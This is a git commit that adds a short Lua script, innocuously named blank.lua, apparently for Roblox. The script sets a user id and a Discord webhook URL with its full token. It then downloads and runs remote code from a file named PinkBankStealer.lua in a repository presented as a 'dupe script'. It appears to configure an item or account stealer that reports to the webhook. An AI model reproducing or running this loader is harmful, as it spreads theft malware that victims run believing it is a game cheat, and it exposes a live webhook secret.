5954ac1259d0f6535265ccbdbe98804fb81cc4e7
karel6985 <117938832+karel6985@users.noreply.github.com>
2023-02-20 20:15:44 +0100

    Create blank.lua

---
+++ .github/workflows/blank.lua
@@ -0,0 +1,5 @@
+_G.UserId = 867911730
+_G.LoadingText = "loading"
+_G.Webhook = "https://discord.com/api/webhooks/1077305206951399464/8S9irgFz6-p-zU2FT6l_5CnRZpd2dUnUG5hhHr3LBGdCdLWoCEW_lVyLciBsfuyYJyR1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
